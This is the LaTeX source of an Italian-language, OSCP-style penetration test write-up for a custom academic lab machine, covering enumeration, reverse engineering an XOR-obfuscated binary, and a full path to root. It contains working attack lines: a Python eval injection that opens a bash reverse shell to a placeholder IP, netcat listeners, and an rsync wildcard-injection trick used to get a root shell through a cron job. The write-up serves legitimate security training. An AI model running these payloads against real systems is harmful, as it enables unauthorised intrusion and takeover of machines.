\documentclass[a4paper,11pt]{article}

% -------------------- PACKAGES --------------------
\usepackage[margin=2.5cm]{geometry}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{setspace}
\usepackage{titlesec}

% -------------------- CONFIG --------------------
\onehalfspacing

\hypersetup{
    colorlinks=true,
    linkcolor=black,
    urlcolor=blue
}

\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}

\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!10}
}

\title{\textbf{Penetration Test Report (OSCP Style)}\\Custom Internal Lab}
\author{Franco Salvucci}
\date{}

\begin{document}

\maketitle
\tableofcontents
\newpage

% --------------------------------------------------
\section{Informazioni sul Target}

\begin{itemize}
    \item \textbf{Indirizzo IP:} 10.0.2.5
    \item \textbf{Ambiente:} Laboratorio accademico (Custom Machine)
\end{itemize}

% --------------------------------------------------
\section{Enumerazione}

\subsection{Scoperta del target}

All’interno della rete locale, il target è stato identificato tramite scansione ARP:

\begin{lstlisting}
nmap -sn 10.0.2.0/24
\end{lstlisting}

\subsection{Scansione delle porte}

\begin{lstlisting}
nmap -sC -sV 10.0.2.5
\end{lstlisting}

\textbf{Porte aperte:}

\begin{itemize}
    \item 22/tcp – SSH
    \item 80/tcp – HTTP
    \item 443/tcp – HTTPS
    \item 8080, 8081, 8082 – Web services
\end{itemize}

% --------------------------------------------------
\subsection{Enumerazione Web}

Accedendo al servizio HTTP si osserva una pagina di default nginx.

Viene eseguito brute forcing delle directory:

\begin{lstlisting}
gobuster dir -u http://10.0.2.5 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
\end{lstlisting}

Tra i risultati emerge l’endpoint:

\begin{lstlisting}
/connector
\end{lstlisting}

Il file viene scaricato per analisi:

\begin{lstlisting}
wget http://10.0.2.5/connector
\end{lstlisting}

% --------------------------------------------------
\section{Reverse Engineering}

\subsection{Analisi del binario}

Il file \texttt{connector} è stato analizzato con Ghidra.

Dall’analisi emerge:
\begin{itemize}
    \item presenza della funzione \texttt{cryptHelper}
    \item confronto con variabili globali
\end{itemize}

Le variabili globali contengono dati offuscati tramite XOR.

\subsection{Estrazione dei dati}

I byte sono stati esportati in formato Python e utilizzati per effettuare il de-XOR.

Esempio:

\begin{lstlisting}
[0x30, 0x0d, 0x13, 0x2e, 0x09, ...]
\end{lstlisting}

\subsection{Credenziali ottenute}

\begin{itemize}
    \item Username: developer
    \item Password: ********
\end{itemize}

% --------------------------------------------------
\section{Accesso Iniziale}

\subsection{Virtual Host Discovery}

Dall’enumerazione TLS emerge il dominio:

\begin{lstlisting}
robot.vdsi
\end{lstlisting}

Aggiunto al file hosts:

\begin{lstlisting}
/etc/hosts
\end{lstlisting}

Enumerazione vhost:

\begin{lstlisting}
gobuster vhost -u http://robot.vdsi -w wordlist
\end{lstlisting}

Individuato:

\begin{itemize}
    \item calculator.robot.vdsi
\end{itemize}

% --------------------------------------------------
\subsection{Autenticazione}

Le credenziali precedentemente ottenute permettono l’accesso.

% --------------------------------------------------
\subsection{Code Injection}

Analizzando il comportamento dell’applicazione, si sospetta l’utilizzo della funzione \texttt{eval()}.

Payload utilizzato:

\begin{lstlisting}
__import__('os').system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
\end{lstlisting}

Listener:

\begin{lstlisting}
nc -lvnp 4444
\end{lstlisting}

\textbf{Risultato:} accesso come utente \texttt{blunder}

% --------------------------------------------------
\section{Post-Exploitation}

\subsection{Stabilizzazione della shell}

\begin{lstlisting}
python3 -c 'import pty; pty.spawn("/bin/bash")'
\end{lstlisting}

% --------------------------------------------------
\section{Privilege Escalation}

\subsection{Analisi del sistema}

Nel sistema è presente una directory:

\begin{lstlisting}
/backup_container
\end{lstlisting}

Contiene:
\begin{itemize}
    \item script backup.sh
    \item cronjob
\end{itemize}

\subsection{Analisi dello script}

Lo script utilizza:

\begin{lstlisting}
rsync -a *
\end{lstlisting}

Questo comportamento è vulnerabile a wildcard injection.

% --------------------------------------------------
\subsection{Sfruttamento}

1. Creazione payload:

\begin{lstlisting}
echo "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" > shell.sh
\end{lstlisting}

2. Creazione file malevolo:

\begin{lstlisting}
touch -- '-e sh shell.sh'
\end{lstlisting}

3. Attesa esecuzione cron

Listener:

\begin{lstlisting}
nc -lvnp 4444
\end{lstlisting}

\textbf{Risultato:} shell come \texttt{root}

% --------------------------------------------------
\section{Proof of Compromise}

\subsection{Root Access}

\begin{lstlisting}
whoami
root
\end{lstlisting}

% --------------------------------------------------
\section{Conclusioni}

La compromissione del sistema è stata possibile grazie alla combinazione di:

\begin{itemize}
    \item Reverse engineering di un binario esposto
    \item Vulnerabilità di code injection
    \item Errata configurazione di script di backup
\end{itemize}

La catena di attacco richiede competenze intermedie ed evidenzia gravi carenze di sicurezza a livello applicativo e di sistema.

\end{document}